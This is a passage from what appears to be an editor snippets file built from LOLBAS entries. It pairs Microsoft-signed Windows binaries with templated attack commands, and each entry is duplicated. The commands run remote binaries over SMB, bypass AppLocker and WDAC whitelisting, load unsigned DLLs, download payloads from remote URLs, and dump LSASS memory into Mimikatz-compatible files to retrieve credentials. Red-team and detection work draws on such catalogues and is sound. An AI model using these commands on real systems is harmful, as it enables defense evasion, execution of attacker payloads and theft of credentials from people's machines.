        "description": "Remote.exe is Debugging tool included with Windows Debugging Tools. it can Run a remote file, requires  privilege, category: Execute, it can be used for Executing a remote binary without saving file to disk."
    },
    "lolbas Remote.exe Executing a remote binary without saving file to disk": {
        "prefix": "lolbas Remote.exe",
        "body": [
            "Remote.exe is Debugging tool included with Windows Debugging Tools. it can Run a remote file, requires  privilege, category: Execute, it can be used for Executing a remote binary without saving file to disk.",
            "",
            "```sh",
            "Remote.exe /s {PATH_SMB:.exe} anythinghere${0}",
            "```"
        ],
        "description": "Remote.exe is Debugging tool included with Windows Debugging Tools. it can Run a remote file, requires  privilege, category: Execute, it can be used for Executing a remote binary without saving file to disk."
    },
    "FsiAnyCpu.exe Execute payload with Microsoft signed binary to bypass WDAC policies (lolbas)": {
        "prefix": "FsiAnyCpu.exe",
        "body": [
            "FsiAnyCpu.exe is 32/64-bit FSharp (F#) Interpreter included with Visual Studio.. it can Execute F# code via interactive command line, requires  privilege, category: AWL Bypass, it can be used for Execute payload with Microsoft signed binary to bypass WDAC policies.",
            "",
            "```sh",
            "fsianycpu.exe${0}",
            "```"
        ],
        "description": "FsiAnyCpu.exe is 32/64-bit FSharp (F#) Interpreter included with Visual Studio.. it can Execute F# code via interactive command line, requires  privilege, category: AWL Bypass, it can be used for Execute payload with Microsoft signed binary to bypass WDAC policies."
    },
    "lolbas FsiAnyCpu.exe Execute payload with Microsoft signed binary to bypass WDAC policies": {
        "prefix": "lolbas FsiAnyCpu.exe",
        "body": [
            "FsiAnyCpu.exe is 32/64-bit FSharp (F#) Interpreter included with Visual Studio.. it can Execute F# code via interactive command line, requires  privilege, category: AWL Bypass, it can be used for Execute payload with Microsoft signed binary to bypass WDAC policies.",
            "",
            "```sh",
            "fsianycpu.exe${0}",
            "```"
        ],
        "description": "FsiAnyCpu.exe is 32/64-bit FSharp (F#) Interpreter included with Visual Studio.. it can Execute F# code via interactive command line, requires  privilege, category: AWL Bypass, it can be used for Execute payload with Microsoft signed binary to bypass WDAC policies."
    },
    "Bginfo.exe Local execution of VBScript (lolbas)": {
        "prefix": "Bginfo.exe",
        "body": [
            "Bginfo.exe is Background Information Utility included with SysInternals Suite. it can Execute VBscript code that is referenced within the specified .bgi file., requires  privilege, category: AWL Bypass, it can be used for Local execution of VBScript.",
            "",
            "```sh",
            "bginfo.exe {PATH:.bgi} /popup /nolicprompt${0}",
            "```"
        ],
        "description": "Bginfo.exe is Background Information Utility included with SysInternals Suite. it can Execute VBscript code that is referenced within the specified .bgi file., requires  privilege, category: AWL Bypass, it can be used for Local execution of VBScript."
    },
    "lolbas Bginfo.exe Local execution of VBScript": {
        "prefix": "lolbas Bginfo.exe",
        "body": [
            "Bginfo.exe is Background Information Utility included with SysInternals Suite. it can Execute VBscript code that is referenced within the specified .bgi file., requires  privilege, category: AWL Bypass, it can be used for Local execution of VBScript.",
            "",
            "```sh",
            "bginfo.exe {PATH:.bgi} /popup /nolicprompt${0}",
            "```"
        ],
        "description": "Bginfo.exe is Background Information Utility included with SysInternals Suite. it can Execute VBscript code that is referenced within the specified .bgi file., requires  privilege, category: AWL Bypass, it can be used for Local execution of VBScript."
    },
    "Bginfo.exe Remote execution of VBScript (lolbas)": {
        "prefix": "Bginfo.exe",
        "body": [
            "Bginfo.exe is Background Information Utility included with SysInternals Suite. it can This style of execution may not longer work due to patch., requires  privilege, category: AWL Bypass, it can be used for Remote execution of VBScript.",
            "",
            "```sh",
            "\\\\live.sysinternals.com\\Tools\\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt${0}",
            "```"
        ],
        "description": "Bginfo.exe is Background Information Utility included with SysInternals Suite. it can This style of execution may not longer work due to patch., requires  privilege, category: AWL Bypass, it can be used for Remote execution of VBScript."
    },
    "lolbas Bginfo.exe Remote execution of VBScript": {
        "prefix": "lolbas Bginfo.exe",
        "body": [
            "Bginfo.exe is Background Information Utility included with SysInternals Suite. it can This style of execution may not longer work due to patch., requires  privilege, category: AWL Bypass, it can be used for Remote execution of VBScript.",
            "",
            "```sh",
            "\\\\live.sysinternals.com\\Tools\\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt${0}",
            "```"
        ],
        "description": "Bginfo.exe is Background Information Utility included with SysInternals Suite. it can This style of execution may not longer work due to patch., requires  privilege, category: AWL Bypass, it can be used for Remote execution of VBScript."
    },
    "dtutil.exe Use to copies the source file to the destination file (lolbas)": {
        "prefix": "dtutil.exe",
        "body": [
            "dtutil.exe is Microsoft command line utility used to manage SQL Server Integration Services packages.. it can Copy file from source to destination, requires  privilege, category: Copy, it can be used for Use to copies the source file to the destination file.",
            "",
            "```sh",
            "dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext}${0}",
            "```"
        ],
        "description": "dtutil.exe is Microsoft command line utility used to manage SQL Server Integration Services packages.. it can Copy file from source to destination, requires  privilege, category: Copy, it can be used for Use to copies the source file to the destination file."
    },
    "lolbas dtutil.exe Use to copies the source file to the destination file": {
        "prefix": "lolbas dtutil.exe",
        "body": [
            "dtutil.exe is Microsoft command line utility used to manage SQL Server Integration Services packages.. it can Copy file from source to destination, requires  privilege, category: Copy, it can be used for Use to copies the source file to the destination file.",
            "",
            "```sh",
            "dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext}${0}",
            "```"
        ],
        "description": "dtutil.exe is Microsoft command line utility used to manage SQL Server Integration Services packages.. it can Copy file from source to destination, requires  privilege, category: Copy, it can be used for Use to copies the source file to the destination file."
    },
    "DefaultPack.EXE Can be used to execute stagers, binaries, and other malicious commands. (lolbas)": {
        "prefix": "DefaultPack.EXE",
        "body": [
            "DefaultPack.EXE is This binary can be downloaded along side multiple software downloads on the Microsoft website. It gets downloaded when the user forgets to uncheck the option to set Bing as the default search provider.. it can Use DefaultPack.EXE to execute arbitrary binaries, with added argument support., requires  privilege, category: Execute, it can be used for Can be used to execute stagers, binaries, and other malicious commands..",
            "",
            "```sh",
            "DefaultPack.EXE /C:\"{CMD}\"${0}",
            "```"
        ],
        "description": "DefaultPack.EXE is This binary can be downloaded along side multiple software downloads on the Microsoft website. It gets downloaded when the user forgets to uncheck the option to set Bing as the default search provider.. it can Use DefaultPack.EXE to execute arbitrary binaries, with added argument support., requires  privilege, category: Execute, it can be used for Can be used to execute stagers, binaries, and other malicious commands.."
    },
    "lolbas DefaultPack.EXE Can be used to execute stagers, binaries, and other malicious commands.": {
        "prefix": "lolbas DefaultPack.EXE",
        "body": [
            "DefaultPack.EXE is This binary can be downloaded along side multiple software downloads on the Microsoft website. It gets downloaded when the user forgets to uncheck the option to set Bing as the default search provider.. it can Use DefaultPack.EXE to execute arbitrary binaries, with added argument support., requires  privilege, category: Execute, it can be used for Can be used to execute stagers, binaries, and other malicious commands..",
            "",
            "```sh",
            "DefaultPack.EXE /C:\"{CMD}\"${0}",
            "```"
        ],
        "description": "DefaultPack.EXE is This binary can be downloaded along side multiple software downloads on the Microsoft website. It gets downloaded when the user forgets to uncheck the option to set Bing as the default search provider.. it can Use DefaultPack.EXE to execute arbitrary binaries, with added argument support., requires  privilege, category: Execute, it can be used for Can be used to execute stagers, binaries, and other malicious commands.."
    },
    "Procdump.exe Performs execution of unsigned DLL. (lolbas)": {
        "prefix": "Procdump.exe",
        "body": [
            "Procdump.exe is SysInternals Memory Dump Tool. it can Loads the specified DLL where configured with DLL_PROCESS_ATTACH execution, process argument can be arbitrary., requires  privilege, category: Execute, it can be used for Performs execution of unsigned DLL..",
            "",
            "```sh",
            "procdump.exe -md {PATH:.dll} foobar${0}",
            "```"
        ],
        "description": "Procdump.exe is SysInternals Memory Dump Tool. it can Loads the specified DLL where configured with DLL_PROCESS_ATTACH execution, process argument can be arbitrary., requires  privilege, category: Execute, it can be used for Performs execution of unsigned DLL.."
    },
    "lolbas Procdump.exe Performs execution of unsigned DLL.": {
        "prefix": "lolbas Procdump.exe",
        "body": [
            "Procdump.exe is SysInternals Memory Dump Tool. it can Loads the specified DLL where configured with DLL_PROCESS_ATTACH execution, process argument can be arbitrary., requires  privilege, category: Execute, it can be used for Performs execution of unsigned DLL..",
            "",
            "```sh",
            "procdump.exe -md {PATH:.dll} foobar${0}",
            "```"
        ],
        "description": "Procdump.exe is SysInternals Memory Dump Tool. it can Loads the specified DLL where configured with DLL_PROCESS_ATTACH execution, process argument can be arbitrary., requires  privilege, category: Execute, it can be used for Performs execution of unsigned DLL.."
    },
    "winfile.exe Performs execution of specified file, can be used as a defense evasion (lolbas)": {
        "prefix": "winfile.exe",
        "body": [
            "winfile.exe is Windows File Manager executable. it can Execute an executable file with WinFile as a parent process., requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used as a defense evasion.",
            "",
            "```sh",
            "winfile.exe {PATH:.exe}${0}",
            "```"
        ],
        "description": "winfile.exe is Windows File Manager executable. it can Execute an executable file with WinFile as a parent process., requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used as a defense evasion."
    },
    "lolbas winfile.exe Performs execution of specified file, can be used as a defense evasion": {
        "prefix": "lolbas winfile.exe",
        "body": [
            "winfile.exe is Windows File Manager executable. it can Execute an executable file with WinFile as a parent process., requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used as a defense evasion.",
            "",
            "```sh",
            "winfile.exe {PATH:.exe}${0}",
            "```"
        ],
        "description": "winfile.exe is Windows File Manager executable. it can Execute an executable file with WinFile as a parent process., requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used as a defense evasion."
    },
    "Msdeploy.exe Local execution of batch file using msdeploy.exe. (lolbas)": {
        "prefix": "Msdeploy.exe",
        "body": [
            "Msdeploy.exe is Microsoft tool used to deploy Web Applications.. it can Launch .bat file via msdeploy.exe., requires  privilege, category: AWL Bypass, it can be used for Local execution of batch file using msdeploy.exe..",
            "",
            "```sh",
            "msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=\"{PATH_ABSOLUTE:.bat}\"${0}",
            "```"
        ],
        "description": "Msdeploy.exe is Microsoft tool used to deploy Web Applications.. it can Launch .bat file via msdeploy.exe., requires  privilege, category: AWL Bypass, it can be used for Local execution of batch file using msdeploy.exe.."
    },
    "lolbas Msdeploy.exe Local execution of batch file using msdeploy.exe.": {
        "prefix": "lolbas Msdeploy.exe",
        "body": [
            "Msdeploy.exe is Microsoft tool used to deploy Web Applications.. it can Launch .bat file via msdeploy.exe., requires  privilege, category: AWL Bypass, it can be used for Local execution of batch file using msdeploy.exe..",
            "",
            "```sh",
            "msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=\"{PATH_ABSOLUTE:.bat}\"${0}",
            "```"
        ],
        "description": "Msdeploy.exe is Microsoft tool used to deploy Web Applications.. it can Launch .bat file via msdeploy.exe., requires  privilege, category: AWL Bypass, it can be used for Local execution of batch file using msdeploy.exe.."
    },
    "Msdeploy.exe Copy file. (lolbas)": {
        "prefix": "Msdeploy.exe",
        "body": [
            "Msdeploy.exe is Microsoft tool used to deploy Web Applications.. it can Copy file from source to destination., requires  privilege, category: Copy, it can be used for Copy file..",
            "",
            "```sh",
            "msdeploy.exe -verb:sync -source:filePath={PATH_ABSOLUTE:.source.ext} -dest:filePath={PATH_ABSOLUTE:.dest.ext}${0}",
            "```"
        ],
        "description": "Msdeploy.exe is Microsoft tool used to deploy Web Applications.. it can Copy file from source to destination., requires  privilege, category: Copy, it can be used for Copy file.."
    },
    "lolbas Msdeploy.exe Copy file.": {
        "prefix": "lolbas Msdeploy.exe",
        "body": [
            "Msdeploy.exe is Microsoft tool used to deploy Web Applications.. it can Copy file from source to destination., requires  privilege, category: Copy, it can be used for Copy file..",
            "",
            "```sh",
            "msdeploy.exe -verb:sync -source:filePath={PATH_ABSOLUTE:.source.ext} -dest:filePath={PATH_ABSOLUTE:.dest.ext}${0}",
            "```"
        ],
        "description": "Msdeploy.exe is Microsoft tool used to deploy Web Applications.. it can Copy file from source to destination., requires  privilege, category: Copy, it can be used for Copy file.."
    },
    "AccCheckConsole.exe Local execution of managed code from assembly DLL. (lolbas)": {
        "prefix": "AccCheckConsole.exe",
        "body": [
            "AccCheckConsole.exe is Verifies UI accessibility requirements. it can Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name., requires  privilege, category: Execute, it can be used for Local execution of managed code from assembly DLL..",
            "",
            "```sh",
            "AccCheckConsole.exe -window \"Untitled - Notepad\" {PATH_ABSOLUTE:.dll}${0}",
            "```"
        ],
        "description": "AccCheckConsole.exe is Verifies UI accessibility requirements. it can Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name., requires  privilege, category: Execute, it can be used for Local execution of managed code from assembly DLL.."
    },
    "lolbas AccCheckConsole.exe Local execution of managed code from assembly DLL.": {
        "prefix": "lolbas AccCheckConsole.exe",
        "body": [
            "AccCheckConsole.exe is Verifies UI accessibility requirements. it can Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name., requires  privilege, category: Execute, it can be used for Local execution of managed code from assembly DLL..",
            "",
            "```sh",
            "AccCheckConsole.exe -window \"Untitled - Notepad\" {PATH_ABSOLUTE:.dll}${0}",
            "```"
        ],
        "description": "AccCheckConsole.exe is Verifies UI accessibility requirements. it can Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name., requires  privilege, category: Execute, it can be used for Local execution of managed code from assembly DLL.."
    },
    "AccCheckConsole.exe Local execution of managed code to bypass AppLocker. (lolbas)": {
        "prefix": "AccCheckConsole.exe",
        "body": [
            "AccCheckConsole.exe is Verifies UI accessibility requirements. it can Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name., requires  privilege, category: AWL Bypass, it can be used for Local execution of managed code to bypass AppLocker..",
            "",
            "```sh",
            "AccCheckConsole.exe -window \"Untitled - Notepad\" {PATH_ABSOLUTE:.dll}${0}",
            "```"
        ],
        "description": "AccCheckConsole.exe is Verifies UI accessibility requirements. it can Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name., requires  privilege, category: AWL Bypass, it can be used for Local execution of managed code to bypass AppLocker.."
    },
    "lolbas AccCheckConsole.exe Local execution of managed code to bypass AppLocker.": {
        "prefix": "lolbas AccCheckConsole.exe",
        "body": [
            "AccCheckConsole.exe is Verifies UI accessibility requirements. it can Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name., requires  privilege, category: AWL Bypass, it can be used for Local execution of managed code to bypass AppLocker..",
            "",
            "```sh",
            "AccCheckConsole.exe -window \"Untitled - Notepad\" {PATH_ABSOLUTE:.dll}${0}",
            "```"
        ],
        "description": "AccCheckConsole.exe is Verifies UI accessibility requirements. it can Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name., requires  privilege, category: AWL Bypass, it can be used for Local execution of managed code to bypass AppLocker.."
    },
    "Sqldumper.exe Dump process using PID. (lolbas)": {
        "prefix": "Sqldumper.exe",
        "body": [
            "Sqldumper.exe is Debugging utility included with Microsoft SQL.. it can Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp)., requires  privilege, category: Dump, it can be used for Dump process using PID..",
            "",
            "```sh",
            "sqldumper.exe 464 0 0x0110${0}",
            "```"
        ],
        "description": "Sqldumper.exe is Debugging utility included with Microsoft SQL.. it can Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp)., requires  privilege, category: Dump, it can be used for Dump process using PID.."
    },
    "lolbas Sqldumper.exe Dump process using PID.": {
        "prefix": "lolbas Sqldumper.exe",
        "body": [
            "Sqldumper.exe is Debugging utility included with Microsoft SQL.. it can Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp)., requires  privilege, category: Dump, it can be used for Dump process using PID..",
            "",
            "```sh",
            "sqldumper.exe 464 0 0x0110${0}",
            "```"
        ],
        "description": "Sqldumper.exe is Debugging utility included with Microsoft SQL.. it can Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp)., requires  privilege, category: Dump, it can be used for Dump process using PID.."
    },
    "Sqldumper.exe Dump LSASS.exe to Mimikatz compatible dump using PID. (lolbas)": {
        "prefix": "Sqldumper.exe",
        "body": [
            "Sqldumper.exe is Debugging utility included with Microsoft SQL.. it can 0x01100:40 flag will create a Mimikatz compatible dump file., requires  privilege, category: Dump, it can be used for Dump LSASS.exe to Mimikatz compatible dump using PID..",
            "",
            "```sh",
            "sqldumper.exe 540 0 0x01100:40${0}",
            "```"
        ],
        "description": "Sqldumper.exe is Debugging utility included with Microsoft SQL.. it can 0x01100:40 flag will create a Mimikatz compatible dump file., requires  privilege, category: Dump, it can be used for Dump LSASS.exe to Mimikatz compatible dump using PID.."
    },
    "lolbas Sqldumper.exe Dump LSASS.exe to Mimikatz compatible dump using PID.": {
        "prefix": "lolbas Sqldumper.exe",
        "body": [
            "Sqldumper.exe is Debugging utility included with Microsoft SQL.. it can 0x01100:40 flag will create a Mimikatz compatible dump file., requires  privilege, category: Dump, it can be used for Dump LSASS.exe to Mimikatz compatible dump using PID..",
            "",
            "```sh",
            "sqldumper.exe 540 0 0x01100:40${0}",
            "```"
        ],
        "description": "Sqldumper.exe is Debugging utility included with Microsoft SQL.. it can 0x01100:40 flag will create a Mimikatz compatible dump file., requires  privilege, category: Dump, it can be used for Dump LSASS.exe to Mimikatz compatible dump using PID.."
    },
    "Dump64.exe Create memory dump and parse it offline to retrieve credentials. (lolbas)": {
        "prefix": "Dump64.exe",
        "body": [
            "Dump64.exe is Memory dump tool that comes with Microsoft Visual Studio. it can Creates a memory dump of the LSASS process., requires  privilege, category: Dump, it can be used for Create memory dump and parse it offline to retrieve credentials..",
            "",
            "```sh",
            "dump64.exe {PID} out.dmp${0}",
            "```"
        ],
        "description": "Dump64.exe is Memory dump tool that comes with Microsoft Visual Studio. it can Creates a memory dump of the LSASS process., requires  privilege, category: Dump, it can be used for Create memory dump and parse it offline to retrieve credentials.."
    },
    "lolbas Dump64.exe Create memory dump and parse it offline to retrieve credentials.": {
        "prefix": "lolbas Dump64.exe",
        "body": [
            "Dump64.exe is Memory dump tool that comes with Microsoft Visual Studio. it can Creates a memory dump of the LSASS process., requires  privilege, category: Dump, it can be used for Create memory dump and parse it offline to retrieve credentials..",
            "",
            "```sh",
            "dump64.exe {PID} out.dmp${0}",
            "```"
        ],
        "description": "Dump64.exe is Memory dump tool that comes with Microsoft Visual Studio. it can Creates a memory dump of the LSASS process., requires  privilege, category: Dump, it can be used for Create memory dump and parse it offline to retrieve credentials.."
    },
    "ProtocolHandler.exe It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction) (lolbas)": {
        "prefix": "ProtocolHandler.exe",
        "body": [
            "ProtocolHandler.exe is Microsoft Office binary. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction).",
            "",
            "```sh",
            "ProtocolHandler.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "ProtocolHandler.exe is Microsoft Office binary. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction)."
    },
    "lolbas ProtocolHandler.exe It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction)": {
        "prefix": "lolbas ProtocolHandler.exe",
        "body": [
            "ProtocolHandler.exe is Microsoft Office binary. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction).",
            "",
            "```sh",
            "ProtocolHandler.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "ProtocolHandler.exe is Microsoft Office binary. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction)."
    },
    "WFMFormat.exe Proxy execution of binary (lolbas)": {
        "prefix": "WFMFormat.exe",
        "body": [
            "WFMFormat.exe is Command-line tool used for pretty-print a dump file generated by Message Farm Analyzer tool.. it can Executes the file `tracerpt.exe` in the same folder as `WFMFormat.exe`. If the file `dumpfile.txt` (any content) exists in the current working directory, no arguments are required. Note that `WFMFormat.exe` requires .NET Framework 3.5., requires  privilege, category: Execute, it can be used for Proxy execution of binary.",
            "",
            "```sh",
            "WFMFormat.exe${0}",
            "```"
        ],
        "description": "WFMFormat.exe is Command-line tool used for pretty-print a dump file generated by Message Farm Analyzer tool.. it can Executes the file `tracerpt.exe` in the same folder as `WFMFormat.exe`. If the file `dumpfile.txt` (any content) exists in the current working directory, no arguments are required. Note that `WFMFormat.exe` requires .NET Framework 3.5., requires  privilege, category: Execute, it can be used for Proxy execution of binary."
    },
    "lolbas WFMFormat.exe Proxy execution of binary": {
        "prefix": "lolbas WFMFormat.exe",
        "body": [
            "WFMFormat.exe is Command-line tool used for pretty-print a dump file generated by Message Farm Analyzer tool.. it can Executes the file `tracerpt.exe` in the same folder as `WFMFormat.exe`. If the file `dumpfile.txt` (any content) exists in the current working directory, no arguments are required. Note that `WFMFormat.exe` requires .NET Framework 3.5., requires  privilege, category: Execute, it can be used for Proxy execution of binary.",
            "",
            "```sh",
            "WFMFormat.exe${0}",
            "```"
        ],
        "description": "WFMFormat.exe is Command-line tool used for pretty-print a dump file generated by Message Farm Analyzer tool.. it can Executes the file `tracerpt.exe` in the same folder as `WFMFormat.exe`. If the file `dumpfile.txt` (any content) exists in the current working directory, no arguments are required. Note that `WFMFormat.exe` requires .NET Framework 3.5., requires  privilege, category: Execute, it can be used for Proxy execution of binary."
    },
    "Update.exe Download binary (lolbas)": {
        "prefix": "Update.exe",
        "body": [
            "Update.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can The above binary will go to url and look for RELEASES file and download the nuget package., requires  privilege, category: Download, it can be used for Download binary.",
            "",
            "```sh",
            "Update.exe --download {REMOTEURL}${0}",
            "```"
        ],
        "description": "Update.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can The above binary will go to url and look for RELEASES file and download the nuget package., requires  privilege, category: Download, it can be used for Download binary."
    },
    "lolbas Update.exe Download binary": {
        "prefix": "lolbas Update.exe",
        "body": [
            "Update.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can The above binary will go to url and look for RELEASES file and download the nuget package., requires  privilege, category: Download, it can be used for Download binary.",
            "",
            "```sh",
            "Update.exe --download {REMOTEURL}${0}",
            "```"
        ],
        "description": "Update.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can The above binary will go to url and look for RELEASES file and download the nuget package., requires  privilege, category: Download, it can be used for Download binary."
    },
    "Update.exe Download and execute binary (lolbas)": {
        "prefix": "Update.exe",
        "body": [
            "Update.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA., requires  privilege, category: Execute, it can be used for Download and execute binary.",
            "",
            "```sh",
            "Update.exe --updateRollback={PATH_SMB:folder}${0}",
            "```"
        ],
        "description": "Update.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA., requires  privilege, category: Execute, it can be used for Download and execute binary."
    },
    "lolbas Update.exe Download and execute binary": {
        "prefix": "lolbas Update.exe",
        "body": [
            "Update.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA., requires  privilege, category: Execute, it can be used for Download and execute binary.",
            "",
            "```sh",
            "Update.exe --updateRollback={PATH_SMB:folder}${0}",
            "```"
        ],
        "description": "Update.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA., requires  privilege, category: Execute, it can be used for Download and execute binary."
    },
    "Update.exe Application Whitelisting Bypass (lolbas)": {
        "prefix": "Update.exe",
        "body": [
            "Update.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied., requires  privilege, category: AWL Bypass, it can be used for Application Whitelisting Bypass.",
            "",
            "```sh",
            "Update.exe --processStart {PATH:.exe} --process-start-args \"{CMD:args}\"${0}",
            "```"
        ],
        "description": "Update.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied., requires  privilege, category: AWL Bypass, it can be used for Application Whitelisting Bypass."
    },
    "lolbas Update.exe Application Whitelisting Bypass": {
        "prefix": "lolbas Update.exe",
        "body": [
            "Update.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied., requires  privilege, category: AWL Bypass, it can be used for Application Whitelisting Bypass.",
            "",
            "```sh",
            "Update.exe --processStart {PATH:.exe} --process-start-args \"{CMD:args}\"${0}",
            "```"
        ],
        "description": "Update.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied., requires  privilege, category: AWL Bypass, it can be used for Application Whitelisting Bypass."
    },
    "Update.exe Execute binary (lolbas)": {
        "prefix": "Update.exe",
        "body": [
            "Update.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can Run the command to remove the shortcut created in the \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" directory you created with the LolBinExecution \"--createShortcut\" described on this page., requires  privilege, category: Execute, it can be used for Execute binary.",
            "",
            "```sh",
            "Update.exe --removeShortcut={PATH:.exe}-l=Startup${0}",
            "```"
        ],
        "description": "Update.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can Run the command to remove the shortcut created in the \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" directory you created with the LolBinExecution \"--createShortcut\" described on this page., requires  privilege, category: Execute, it can be used for Execute binary."
    },
    "lolbas Update.exe Execute binary": {
        "prefix": "lolbas Update.exe",
        "body": [
            "Update.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can Run the command to remove the shortcut created in the \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" directory you created with the LolBinExecution \"--createShortcut\" described on this page., requires  privilege, category: Execute, it can be used for Execute binary.",
            "",
            "```sh",
            "Update.exe --removeShortcut={PATH:.exe}-l=Startup${0}",
            "```"
        ],
        "description": "Update.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can Run the command to remove the shortcut created in the \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" directory you created with the LolBinExecution \"--createShortcut\" described on this page., requires  privilege, category: Execute, it can be used for Execute binary."
    },
    "te.exe Execute Visual Basic script stored in local Windows Script Component file. (lolbas)": {
        "prefix": "te.exe",
        "body": [
            "te.exe is Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).. it can Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file., requires  privilege, category: Execute, it can be used for Execute Visual Basic script stored in local Windows Script Component file..",
            "",
            "```sh",
            "te.exe {PATH:.wsc}${0}",
            "```"
        ],
        "description": "te.exe is Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).. it can Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file., requires  privilege, category: Execute, it can be used for Execute Visual Basic script stored in local Windows Script Component file.."
    },
    "lolbas te.exe Execute Visual Basic script stored in local Windows Script Component file.": {
        "prefix": "lolbas te.exe",
        "body": [
            "te.exe is Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).. it can Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file., requires  privilege, category: Execute, it can be used for Execute Visual Basic script stored in local Windows Script Component file..",
            "",
            "```sh",
            "te.exe {PATH:.wsc}${0}",
            "```"
        ],
        "description": "te.exe is Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).. it can Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file., requires  privilege, category: Execute, it can be used for Execute Visual Basic script stored in local Windows Script Component file.."
    },
    "te.exe Execute DLL file. (lolbas)": {
        "prefix": "te.exe",
        "body": [
            "te.exe is Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).. it can Execute commands from a DLL file with Test Authoring and Execution Framework (TAEF) tests. See resources section for required structures., requires  privilege, category: Execute, it can be used for Execute DLL file..",
            "",
            "```sh",
            "te.exe {PATH:.dll}${0}",
            "```"
        ],
        "description": "te.exe is Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).. it can Execute commands from a DLL file with Test Authoring and Execution Framework (TAEF) tests. See resources section for required structures., requires  privilege, category: Execute, it can be used for Execute DLL file.."
    },
    "lolbas te.exe Execute DLL file.": {
        "prefix": "lolbas te.exe",
        "body": [
            "te.exe is Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).. it can Execute commands from a DLL file with Test Authoring and Execution Framework (TAEF) tests. See resources section for required structures., requires  privilege, category: Execute, it can be used for Execute DLL file..",
            "",
            "```sh",
